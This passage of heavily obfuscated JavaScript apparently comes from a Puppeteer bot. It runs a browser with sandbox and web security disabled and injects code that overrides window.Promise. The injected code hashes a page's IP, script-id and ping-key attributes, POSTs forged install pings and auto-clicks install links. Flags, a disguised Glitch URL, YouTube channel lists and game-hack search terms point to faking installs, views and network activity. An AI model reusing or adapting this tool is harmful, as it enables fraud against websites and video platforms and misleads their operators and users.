0x562 * 0x1 + 0x1854] |= (0x2a4 * 0x2 + 0xa * -0x3bd + 0x1 * 0x210a | L >> -0x2026 + 0xe65 + 0x1b * 0xa9) << y[0x1b5d + -0x17b8 + -0x3a2 & N++], P[N >> -0x52 * 0x5d + -0x7a * -0x1 + 0x1d52] |= (0xbff * -0x1 + -0x24cf + 0x314e | L >> 0x10db + 0x24a7 + -0x3576 & -0x12 * -0x97 + 0x1 * -0x128f + -0x106 * -0x8) << y[0x7 * 0xd8 + 0x2 * -0xdd7 + -0x1fb * -0xb & N++], P[N >> 0xde1 * 0x1 + 0xeb9 + -0x1c98] |= (-0x1f7 * 0x5 + 0x5 * 0x797 + 0x11 * -0x1a0 | L >> 0x2576 + -0x5 * -0x677 + -0x45c3 & -0x7 * 0x1af + -0x19c1 + 0x25c9) << y[0xdd3 + -0x2501 + -0x1731 * -0x1 & N++], P[N >> 0x12bd + -0x38a * 0x1 + -0xf31] |= (-0xb04 + 0xf2 + 0xa92 | 0x1b8f + -0x24f2 + 0x9a2 & L) << y[0x86 * 0x4a + 0x16cd * 0x1 + 0xe * -0x465 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x201c + -0x3 * -0x9f5 + 0x3dbb * -0x1 ? (this['block'] = P[-0x9fe * -0x1 + -0x15a4 + 0x5db * 0x2], this['start'] = N - (0x26eb + 0x2 * 0x137b + -0x4da1), this['hash'](), this['hashed'] = -0x13ab + 0x394 + 0x1018) : this['start'] = N;
                }
                return this['bytes'] > 0x8cc745f0 + 0x444991a1 * 0x3 + -0x59a3fad4 && (this['hBytes'] += this['bytes'] / (0x1258bd02c + 0x522c2570 + -0xd * 0x935890c) << -0x1365 + 0xb * 0xce + 0xa8b, this['bytes'] = this['bytes'] % (0x1782baa34 + -0x17deb4358 + 0x1913e3c * 0xa7)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1322 * 0x2 + -0x5 * -0x2ef + 0x21e * -0x19;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x367 * -0x4 + -0x2069 + 0x1 * 0x12dd] = this['block'], J[K >> -0x1064 + 0x259 + 0xe0d] |= x[-0x63d * 0x3 + -0xba0 + 0x5 * 0x612 & K], this['block'] = J[0x1343 * -0x2 + -0x256e + 0x4c04], K >= -0x1c0a + -0xf77 + -0x27 * -0x11f && (this['hashed'] || this['hash'](), J[0x252f + 0x3 * -0x281 + -0x1dac] = this['block'], J[0xcf9 + -0x1 * -0x6d3 + -0x13bc] = J[0x15a6 + 0x14aa * 0x1 + -0x2a4f] = J[0xebf + 0x1a53 * 0x1 + 0x4 * -0xa44] = J[-0x5d3 + -0xb97 + 0x116d] = J[-0x1 * -0x119 + -0x1a48 + 0x1933 * 0x1] = J[-0x948 + -0x80e * 0x1 + 0x115b] = J[0x11be + -0x1cdb * -0x1 + -0x2e93] = J[-0x12dd * -0x1 + -0x1048 + 0x6d * -0x6] = J[0x4 * -0x81d + -0x3 * -0x803 + 0x873] = J[0x1d7c + -0x1 * 0xb93 + -0x11e0] = J[0x1162 + 0x1edd + -0x3035] = J[0x1f * -0x3e + -0xa * 0x1d9 + 0x1 * 0x1a07] = J[-0x2 * -0xf53 + 0x3d * 0x6b + 0x1 * -0x3819] = J[0x1633 * 0x1 + -0x2 * -0x12c1 + -0x3ba8] = J[-0x665 * -0x4 + -0x8b6 + -0x10d * 0x10] = J[-0x1dc1 + 0x6 * -0x5cb + 0x4092] = 0x1d32 + 0x1 * -0x789 + -0x15a9), J[0x129f + 0x193c + -0x2bcd * 0x1] = this['hBytes'] << -0x22f6 + -0xb * 0x281 + 0x3e84 | this['bytes'] >>> 0xc3b + 0x5 * -0x66e + 0x1408, J[-0x3 * -0x9f + -0x2269 * -0x1 + -0x49 * 0x7f] = this['bytes'] << 0xdc5 + -0x245d + 0x169b, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x1 * -0x2709 + 0x19b1 * 0x1 + 0xd68; J < -0x1270 * 0x2 + -0x4 * 0x7ca + 0x4458; ++J)
                K = Q[J - (0x1 * 0x1c7e + 0x799 * -0x4 + 0x1e9)] ^ Q[J - (-0x377 * -0x1 + 0x47b + -0x7ea)] ^ Q[J - (-0x6 * -0xf1 + 0x1cc2 + -0x225a)] ^ Q[J - (0x227d + 0x1159 * -0x2 + 0x45)], Q[J] = K << 0x767 + 0x9b9 * 0x1 + 0x3 * -0x5b5 | K >>> -0x335 + 0x16ea + -0x1396 * 0x1;
              for (J = -0x1198 + -0x6d0 + 0x238 * 0xb; J < -0x7 * 0x49f + 0xfa * -0x21 + 0x1 * 0x40a7; J += -0x3e5 * 0x2 + 0x40 * 0x8 + 0x5cf)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3 * 0x501 + 0x21a2 + -0x129a | L >>> 0x2104 + 0x1510 + -0x35f9) + (M & N | ~M & O) + P + (-0xd5b1 * -0x424 + -0x81253036 + -0x1047 * -0xd483d) + Q[J] << -0x1f5a * -0x1 + -0x7 * -0x525 + -0x435d) << 0x1 * 0x1723 + -0x1 * 0xa21 + -0xcfd * 0x1 | P >>> -0x1 * -0x226d + -0x12d0 + -0xa * 0x18d) + (L & (M = M << 0x1 * -0x163d + 0x112 * -0x8 + 0x1eeb | M >>> 0xe * -0x22a + -0x159d + 0x33eb * 0x1) | ~L & N) + O + (0x1 * -0x46826eb6 + -0xa950df * -0x96 + 0x3dcf85a5) + Q[J + (-0x1863 + -0x1181 + 0x29e5)] << -0x1a58 + 0x1c57 + -0x1ff) << 0x1 * 0x1a03 + -0x116 * 0x20 + 0x2 * 0x461 | O >>> -0x20ef + 0x636 * 0x4 + 0x832) + (P & (L = L << -0x6d * -0x2a + 0x1 * -0x8f9 + -0x8cb | L >>> 0x11 * 0x39 + -0x1552 + -0x1f3 * -0x9) | ~P & M) + N + (0x25 * -0x1cdbf61 + 0x40 * 0x223197e + 0x1478c31e) + Q[J + (-0x1 * -0x164f + -0x482 + -0x1 * 0x11cb)] << 0xdf * -0xb + -0xf55 + 0x18ea) << 0x1 * -0x767 + -0x19a6 + 0xf9 * 0x22 | N >>> 0x2ef * 0x5 + -0x4b2 + 0x9de * -0x1) + (O & (P = P << -0x12cd + 0x1 * 0x6d6 + -0x407 * -0x3 | P >>> 0x4 * -0x397 + -0x1 * -0x559 + -0x905 * -0x1) | ~O & L) + M + (-0x63954dff + -0x74d7ce5 * -0xd + 0x5f286ff7) + Q[J + (-0x3b * -0xa1 + -0x1ebf + -0x659)] << 0x86d + -0x50 + -0x81d) << 0x131 * 0x16 + 0x1 * -0x2352 + 0x921 | M >>> 0x1c59 + -0x1c6e + 0x30) + (N & (O = O << 0x12f8 * 0x1 + 0xdb2 + -0x208c | O >>> -0x1 * -0x17ea + -0x2345 * -0x1 + -0x3b2d) | ~N & P) + L + (0x391 * -0x255b71 + 0x92599ea3 + 0x1 * 0x4d63f8f7) + Q[J + (-0x1a4d + -0x6 * -0x1d2 + 0xf65)] << 0x1f12 + 0x9 * 0x377 + -0x3e41, N = N << 0x26 * -0x8b + 0xb * -0x26e + 0x2f7a | N >>> 0x502 * -0x7 + -0x2604 + -0x1245 * -0x4;
              for (; J < -0x1 * -0x1519 + 0x22ab + -0x379c; J += 0x7a2 + -0x218b + 0x19ee)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x4b3 + -0x2 * 0x4ea + 0x2 * 0x293 | L >>> -0x2111 * -0x1 + 0x1e51 + -0x3f47) + (M ^ N ^ O) + P + (0xa1c5e4b0 + -0x10805 * -0x93e5 + -0xcb730488) + Q[J] << -0x1a1 + -0x1b28 + -0x1 * -0x1cc9) << -0xd6f + -0x83 * 0x22 + 0x1eda | P >>> -0xea6 + 0x2540 + -0x167f) + (L ^ (M = M << 0x15a6 + -0x5 * 0x7ba + -0x18e * -0xb | M >>> -0x1a1d + -0xab4 + 0x24d3) ^ N) + O + (-0x77f39 * 0x6ef + 0xddb0667e + 0x9 * -0x68a26f6) + Q[J + (0x2 * 0x23e + -0x1 * -0x2453 + -0x28ce)] << 0x280 + 0x1cd3 + -0x2d9 * 0xb) << 0x6 * -0x1ce + -0x33 * -0x11 + 0xa * 0xbf | O >>> -0x1 * 0x1f0d + 0x1e98 + 0x10 * 0x9) + (P ^ (L = L << 0x25f * -0x3 + -0x5fc + 0xd37 | L >>> 0x21 * -0x74 + 0x1 * 0x1d93 + -0x1 * 0xe9d) ^ M) + N + (-0xdb1ee0bd * -0x1 + -0x47 * 0x2a6113b + -0x19623 * -0x324b) + Q[J + (0x1cb4 + -0x1fe6 + -0xa4 * -0x5)] << -0x1 * 0x1081 + 0x4 * -0x7ca + 0x2fa9) << -0x1f05 + 0x9d2 + 0x1538 | N >>> 0x25a5 + -0x1 * -0x10fb + -0x335 * 0x11) + (O ^ (P = P << -0x899 + -0x3 * -0x7b4 + 0x1 * -0xe65 | P >>> -0x2375 * 0x1 + 0x1be4 + 0x793) ^ L) + M + (-0x404efee9 + -0x23ce717 * -0x4 + 0xa6354e2e) + Q[J + (0x8 * 0x42a + -0x94a * -0x1 + -0x2a97)] << 0xf1 * -0x16 + -0x1c * -0xed + -0x2e * 0x1d) << 0x7d3 + -0x97 * -0x2b + 0x4bd * -0x7 | M >>> 0x2 * 0x1d7 + 0x1193 + -0x1526) + (N ^ (O = O << -0x8e4 + -0x23da + 0x2cdc | O >>> -0x2d + 0x1126 + -0x10f7) ^ P) + L + (-0x22e8db * 0x42 + 0x5acc059f * 0x1 + 0x1d0dee78) + Q[J + (-0x13af * 0x1 + -0x24cc + 0x387f)] << 0x1 * -0x1d3f + 0x1a75 + 0x2ca, N = N << 0x8 * 0x1ca + 0x25 * -0x11 + -0xbbd | N >>> -0x1443 + -0x1 * -0x78e + -0x23 * -0x5d;
              for (; J < -0x4cd + -0x1 * 0xc1d + -0x36e * -0x5; J += 0x225a * 0x1 + 0x1 * -0x867 + -0x19ee)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x15cb + 0x32a + -0x2 * -0x953 | L >>> 0x65 * -0x3b + -0x6 * 0x289 + 0x2698 * 0x1) + (M & N | M & O | N & O) + P - (0x1 * 0x4aa3152f + -0x1 * 0x3aacf63d + -0x5cefd6 * -0x10b) + Q[J] << -0x1 * -0x1b88 + -0x32f * 0x4 + -0xecc) << 0x2122 + 0x2138 + -0x4255 | P >>> -0x1f * 0x12e + -0x8bd * 0x1 + 0x2d6a) + (L & (M = M << 0x14ff + 0x52d + 0x536 * -0x5 | M >>> -0x30 * 0x46 + -0x7 * 0x43e + -0xab5 * -0x4) | L & N | M & N) + O - (-0xbc * -0xeb3289 + -0xd5d3291f + -0x99fe4fa7 * -0x1) + Q[J + (-0x65 * -0x4e + -0x171a + -0x7ab)] << 0x3 * -0x1f2 + -0x90f + 0x3 * 0x4f7) << -0x48 * -0x7f + 0x1fd1 + -0x74 * 0x95 | O >>> 0x1611 * 0x1 + -0x3 * 0xb33 + 0x1 * 0xba3) + (P & (L = L << -0x2 + 0x9b7 + -0x997 | L >>> 0x35f * 0x3 + -0xd * 0x16a + -0x847 * -0x1) | P & M | L & M) + N - (-0x8dc7e18f + 0x1ef32438 + 0xdfb9007b) + Q[J + (-0x12d * -0x8 + 0x1e86 + 0x2da * -0xe)] << -0x13 * 0xb5 + 0x193a + 0x1 * -0xbcb) << 0x2ba + 0x15bc + -0x1871 | N >>> -0x4 * -0x882 + 0x248c * -0x1 + 0x29f) + (O & (P = P << -0x1bf0 + -0x2 * 0x2b3 + 0x2174 | P >>> 0x135f + 0x1a1 * 0x1 + -0x14fe) | O & L | P & L) + M - (0x1cb32751 + 0x7a498287 + -0x261866b4) + Q[J + (-0x2209 * -0x1 + -0x3 * -0x98b + -0x3ea7)] << 0x2696 * 0x1 + -0xd28 * -0x2 + 0x40e6 * -0x1) << 0x1 * -0x33c + -0x5aa + 0x8eb | M >>> -0x539 * -0x1 + -0x977 * 0x1 + 0x459) + (N & (O = O << 0x454 + 0x26 * -0x87 + 0xfd4 | O >>> 0x13f2 + -0x3cf + -0x1021) | N & P | O & P) + L - (-0x1165 * 0xac455 + -0x203d2e45 + 0x14c6a8bf2) + Q[J + (-0xd5e * 0x1 + 0xfbc * -0x1 + 0x1d1e)] << -0x1d * -0x80 + -0x903 + -0x1 * 0x57d, N = N << -0x1f1c + -0x717 + 0x2651 | N >>> 0x1088 + -0x595 * -0x3 + -0x2145;
              for (; J < -0x22ec + 0x20ad + 0x28f * 0x1; J += -0x503 + 0xae2 * 0x2 + -0x10bc)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x18ad + 0x3 * 0xaa9 + -0x1 * 0x749 | L >>> -0x2b * 0x81 + 0x1a8c + -0x4c6) + (M ^ N ^ O) + P - (0x2 * -0x9a675b6 + -0x25bfa58c + 0x6ea9cf22) + Q[J] << 0x19e8 + -0x11 * -0x1ee + -0x3ab6) << -0x20cf * -0x1 + 0x1eb2 + -0x3f7c * 0x1 | P >>> 0x19 * -0x182 + 0x1651 + 0xf7c) + (L ^ (M = M << 0x9 * 0x26b + 0x1 * -0x23b2 + 0x147 * 0xb | M >>> -0x1eb8 + -0x55 * 0x3d + -0x1a5 * -0x1f) ^ N) + O - (0x9 * -0x2d1cc97 + -0x4 * 0x146e8901 + 0x5 * 0x2024b719) + Q[J + (0x1b5d + -0x1dea * -0x1 + -0x3946)] << 0xd3 * -0x1 + -0x18cc + 0x199f * 0x1) << 0x25a7 + 0x177 + -0x2719 | O >>> 0x1436 * -0x1 + 0x1462 + -0x1 * 0x11) + (P ^ (L = L << -0x1 * 0x615 + 0xd19 + -0x2 * 0x373 | L >>> -0x172a + 0x230c + -0xbe0) ^ M) + N - (-0x280bb922 + -0x155f005d * 0x1 + -0x10d5 * -0x6d585) + Q[J + (0x1 * -0x1daa + -0x4 * 0x3a6 + -0x4 * -0xb11)] << 0x19c2 * 0x1 + 0x2 * -0xb93 + -0x29c) << 0x191 * -0x7 + 0x10 * 0x12a + 0xa3 * -0xc | N >>> 0x2019 + 0x1 * -0xd3 + -0x1f2b) + (O ^ (P = P << -0x61 * -0x61 + -0x9b * 0x8 + -0x1fcb | P >>> -0x1e03 + 0x262 * 0xc + 0x16d) ^ L) + M - (0x59eda088 + 0x19 * 0xac0c3 + 0x1 * -0x255d3569) + Q[J + (-0x15e8 + 0x8c4 + 0x1e1 * 0x7)] << -0x1f5 * 0x11 + 0xc13 * 0x2 + 0x91f) << -0x9ce + 0x598 + 0x43b | M >>> 0x2703 + 0x1ad * 0x5 + -0x2d * 0x10d) + (N ^ (O = O << -0xebe + -0x1246 + 0x2122 | O >>> -0x118 * 0xa + -0x1 * -0x85 + 0xa6d) ^ P) + L - (-0x56560b23 + 0x187e8583 * 0x1 + 0x7374c3ca) + Q[J + (0x2bd * 0xc + -0x95c + -0x177c)] << -0x10d5 * -0x1 + 0x847 * -0x4 + 0x1047, N = N << 0x16a3 + 0x1cd7 + -0x2 * 0x19ae | N >>> -0xc * 0x3f + -0x1 * 0xb2e + 0xe24;
              this['h0'] = this['h0'] + L << 0x1651 + 0x58 * 0xb + -0x1a19, this['h1'] = this['h1'] + M << 0x1d * 0xd + 0x81a + -0x2b * 0x39, this['h2'] = this['h2'] + N << 0x218d + -0x1 * 0x2543 + 0x3b6, this['h3'] = this['h3'] + O << -0x25ec + 0x623 * -0x1 + -0x2c0f * -0x1, this['h4'] = this['h4'] + P << 0x1159 + -0xa39 + -0x720;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1462 + 0x3 * 0x92b + -0x703 & 0x2fb + 0x2167 * -0x1 + -0x33 * -0x99] + w[J >> -0x138d + 0x9ae + -0x9f7 * -0x1 & 0x234c + 0x1359 + -0x919 * 0x6] + w[J >> 0xe23 + 0x36c + 0x1 * -0x117b & -0x1b * -0xda + -0x237 * -0xd + -0x33ba] + w[J >> -0x1 * -0x20f2 + -0xa28 + -0x16ba & -0x44f * 0x8 + -0x16 * 0x18a + 0x3d * 0x11f] + w[J >> 0x3 * -0x925 + -0xce4 + 0xc3 * 0x35 & 0x2b * -0xa5 + 0xab * -0xc + 0x23ca] + w[J >> 0x1 * 0x1f75 + 0x2 * -0xa71 + -0xa8b & 0xcd1 + -0x194 + -0xb2e] + w[J >> -0x1d3f + -0x1e7 * -0x7 + -0x7f9 * -0x2 & -0x3 * -0x32f + 0xc8 * 0x1d + -0x2026] + w[-0x2 * -0x3be + -0x8b4 * 0x2 + 0x9fb & J] + w[K >> 0xc50 + -0x1 * -0x95e + -0x1592 & 0x1b6b + -0x11 * -0x3 + -0x1b8f] + w[K >> 0x1936 + 0x1 * 0xe0b + 0x19 * -0x191 & 0x15b5 + 0x21e3 + 0x7 * -0x7ef] + w[K >> 0x1d5d + -0x1ee * -0x1 + -0x1f37 & -0x2385 + 0x262a + -0x296] + w[K >> -0x1 * -0x38c + 0x7 * 0x5f + -0x9 * 0xad & 0x1d81 + -0xeb * 0x29 + 0x831] + w[K >> 0x4cf + -0x9d3 * -0x1 + 0x74b * -0x2 & -0x20 * -0x9 + -0xab9 + 0x4 * 0x26a] + w[K >> 0x23ed + 0x2 * -0x36a + -0x1 * 0x1d11 & 0x7 * -0x9c + -0xc22 + 0x1075] + w[K >> 0x56b * -0x6 + -0xc16 + 0x2c9c & 0x1 * 0xfa6 + 0x1d92 + -0x2d29] + w[0x35c * -0x8 + 0x1a3f + -0x2c * -0x4 & K] + w[L >> 0xe * -0x261 + -0x6be + -0x28 * -0x101 & -0x68 * 0x12 + 0x68e * -0x5 + -0x2825 * -0x1] + w[L >> -0xd62 + -0x12 * -0x94 + 0x312 * 0x1 & 0x1383 * 0x1 + 0xc8 + -0x143c] + w[L >> -0x30a * -0x6 + 0x13d0 + -0x25f8 & -0x7f8 + 0xcd5 + -0x4ce] + w[L >> 0x9 * -0x32f + -0x2476 + 0x412d & -0x168 + 0x2c5 * 0x7 + 0x1 * -0x11ec] + w[L >> -0x135e + -0x1c99 * 0x1 + 0x2d3 * 0x11 & -0x22db + 0x1f3c + 0x3ae * 0x1] + w[L >> 0x15c4 + 0x5 * 0x7d0 + 0xf33 * -0x4 & 0x299 + -0x163c + 0x1 * 0x13b2] + w[L >> -0x1f11 + -0xb52 * 0x2 + 0x35b9 & 0x293 * -0x1 + 0x10cc + -0xe2a] + w[0x5 * -0x71d + -0x1d42 + -0xa * -0x67d & L] + w[M >> -0x209 * 0x11 + -0xf5a + 0x320f & -0x97a + -0xc * -0x289 + -0x14e3] + w[M >> 0xb97 + -0x158 + -0xa27 & -0xdfa * 0x1 + 0x5 * 0x57d + -0xd68] + w[M >> -0x1636 + 0x1ac4 * 0x1 + -0x47a & 0x36 * 0x37 + 0x1 * -0x1937 + 0xdac] + w[M >> 0x1 * 0x1195 + -0x1 * -0x23ef + 0x26e * -0x16 & -0x12d * 0x13 + 0xd * 0x1c9 + 0x9 * -0x17] + w[M >> 0x2109 + 0x20c + -0x2309 & 0x26d5 + -0xd * 0x1 + -0x1af * 0x17] + w[M >> -0x1205 * -0x1 + -0xc8 * -0x19 + -0x2585 & 0x63d * -0x6 + -0x746 + 0x665 * 0x7] + w[M >> -0x1 * -0x7c9 + 0x45a + -0x6b * 0x1d & -0x2e * -0xb9 + -0x6e1 * -0x2 + -0xc5 * 0x3d] + w[-0x240b + -0xa3d * -0x1 + 0x3 * 0x89f & M] + w[N >> -0x209c + 0x92 * -0x3f + 0x2253 * 0x2 & -0x11b8 + -0x7bb + 0x1982] + w[N >> 0x1d9e + 0x1 * -0xf1d + -0xe69 & -0x5 * 0x19a + -0x2 * 0x1319 + 0x2e43] + w[N >> 0x16fe * -0x1 + 0x1 * 0x1be9 + 0x15 * -0x3b & 0x675 + 0x1 * -0xa37 + 0x3d1] + w[N >> -0x1a * -0x3b + -0x736 + 0x148 & -0x26c3 + 0x18d + -0x1 * -0x2545] + w[N >> 0x1d * -0x5 + 0x1884 + -0x1 * 0x17e7 & 0xc9 * 0x10 + -0x10ed + 0x46c] + w[N >> -0x90f * -0x1 + 0x2093 + -0x299a & 0x2069 + -0x2 * -0x1f7 + -0x2448] + w[N >> -0x141a + 0x572 + 0xeac & 0x13 * 0x2b + -0xf5 * 0x26 + -0x213c * -0x1] + w[-0x25a9 + -0x13 * -0x79 + 0x1cbd & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1ce5 + -0x1 * 0x118a + -0xb43 & -0x1 * 0xa4d + 0x6 * 0x1c5 + -0x57 * -0x2,
                J >> -0x5 * 0x667 + 0xcf4 + -0x131f * -0x1 & 0x1ea3 + -0x2629 + -0x3 * -0x2d7,
                J >> 0x7e * 0x4f + 0xbba + 0x6 * -0x86e & 0x1afb + -0x9a + -0x1962,
                0x1772 * -0x1 + 0x164b + 0x5 * 0x6e & J,
                K >> -0x5 * 0x598 + -0x10 * -0x12e + 0x2 * 0x498 & -0x2 * 0x8f3 + 0x2f0 * -0x2 + -0x175 * -0x11,
                K >> -0x1632 + 0x1 * 0x1448 + -0x2e * -0xb & 0x1d92 + -0xe + -0x7 * 0x413,
                K >> 0x175c + -0x1d9 + -0x157b & -0x11d7 * 0x1 + -0x10c8 * -0x1 + -0x1 * -0x20e,
                -0x1 * 0xc0b + 0x35 * 0xa9 + -0x3 * 0x751 & K,
                L >> 0x2350 + 0xd31 + 0xf3 * -0x33 & 0x154b + 0x6 * 0x577 + -0x3516,
                L >> 0x96 * -0x18 + 0x4 * 0x71e + -0xe58 & 0x182f * -0x1 + 0x22e6 * -0x1 + 0x3c14,
                L >> 0xa24 + 0x12c5 + -0x1ce1 & 0x16 * -0x97 + -0xa8f + 0x1888,
                0xcef + 0x11f + 0x1 * -0xd0f & L,
                M >> 0x1534 + -0x2345 + 0x7d * 0x1d & -0x4af + -0x4cf * -0x5 + -0x125d,
                M >> 0xb * 0x365 + -0x1119 * 0x1 + -0x142e & 0xdd + -0x2c5 + 0x2e7,
                M >> 0x1826 + -0x1183 + 0x69b * -0x1 & -0xb * 0x15d + -0x1c47 + 0x2c45,
                0x1a70 + -0x2126 * 0x1 + -0x1 * -0x7b5 & M,
                N >> 0x1 * -0x2589 + 0x29 * 0xef + 0x53 * -0x2 & 0x1 * -0xbdf + -0x3 * 0x355 + 0x16dd,
                N >> -0x43c * -0x7 + 0x209b + -0x3e2f & 0x8 * -0x9a + 0x14e3 * -0x1 + 0x1ab2,
                N >> 0xf8c + -0x1042 + 0xa * 0x13 & -0xd * 0x79 + 0xfa7 * -0x1 + 0x48f * 0x5,
                -0xa4a + -0x1 * -0x10a + -0x3d * -0x2b & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x2025 + -0x15c5 + -0x1 * -0x35fe), (K = new DataView(J))['setUint32'](0x3ed * 0x1 + -0x26 * -0x105 + -0x2aab, this['h0']), K['setUint32'](-0x179e + 0x158e + 0x214, this['h1']), K['setUint32'](-0x23df + 0x3 * -0x75d + -0x23b * -0x1a, this['h2']), K['setUint32'](-0x2585 * -0x1 + -0x2 * 0x7f4 + -0x1591, this['h3']), K['setUint32'](0x4bb + 0x475 + -0x920, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x13ad + -0xb * -0x211 + -0x2a68];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1899 + 0x2ec + 0x15ad;
            J[-0x1c1 * 0x5 + 0x107c + 0x18b * -0x5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x13 * -0x1a3 + -0x718 + 0x3 * 0xcbb] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x1257 + -0x79 * -0x1d + -0xd * 0x277), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x48a + 0x1788 * 0x1 + -0xf * 0x1df;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x1f6a * 0x1 + 0x29 * -0x31 + 0x1 * 0x2d1f), Promise['resolve'](0x1 * -0x222b + 0x3eb + 0x1e41);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * 0xb02 + 0x13ac * 0x1 + 0x8aa * -0x1; j < 0x1 * 0x1c13 + 0x7 * 0x28 + -0x1d2a; j++)
    i();
}
const NETWORK_PATIENCE = 0x1d59 + 0xaa6 + 0x1 * -0x8bf + (0x1420 + 0x23b5 + -0x2c1d) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2 * 0xe46 + 0x1ccf + -0x72b * 0x8) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + U(0x2) + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + V(0x16, 'mQ[q') + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1a7 + 0xb7b * 0x1 + -0xd22; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 